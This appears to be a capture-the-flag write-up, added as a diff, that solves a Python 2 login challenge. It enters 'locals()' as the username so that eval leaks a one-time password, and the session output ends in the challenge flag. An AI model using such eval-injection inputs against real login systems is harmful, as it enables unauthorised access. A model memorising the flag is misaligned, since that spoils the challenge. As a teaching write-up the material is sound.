@@ -1,0 +1,42 @@
+You have 3 attempts:
+
+If you try a non-numerical username, it will say invalid username, using random
+username. If you use a numeric username, it works fine. This is a trait of
+python eval.
+
+Try using 1 + 1 as username. Your username becomes 2. Python eval confirmed
+
+Use locals() as username. You will have a password prompt saying:
+
+Password for <giant list> :
+
+In the giant list, there will be a variable called 'otp'
+
+Copy paste its value as the password.
+
+Example:
+
+$ login.py
+Attempt 1 of 3.
+Username: locals()
+Password for {'generateString': <function generateString at 0x108ebff50>,
+'string': <module 'string' from
+'/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/string.pyc'>,
+'__builtins__': <module '__builtin__' (built-in)>, 'i': 1, '__file__':
+'login.py', 'random': <module 'random' from
+'/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/random.pyc'>,
+'__package__': None, 'USER_USERNAME': '', 'otp':
+'4dP8ZEKwkErOjOjGueRoe995XZg8lgvXWq5KANIK7qpEUCRCOCukd', '__name__': '__main__',
+'__doc__': None, 'ALPHANUMCHARS': ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i',
+'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y',
+'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O',
+'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4',
+'5', '6', '7', '8', '9']} :
+4dP8ZEKwkErOjOjGueRoe995XZg8lgvXWq5KANIK7qpEUCRCOCukd
+
+EVAL_DEM_LOCALS_OTP_REKT
+
+Incorrect!
+Attempt 2 of 3.
+Username: Entry failed. Using randomly generated username.
+Password for qugQhSFxy5CBBx2srVq93cY3WBjebCJrDXfFKZBp2A : Incorrect!
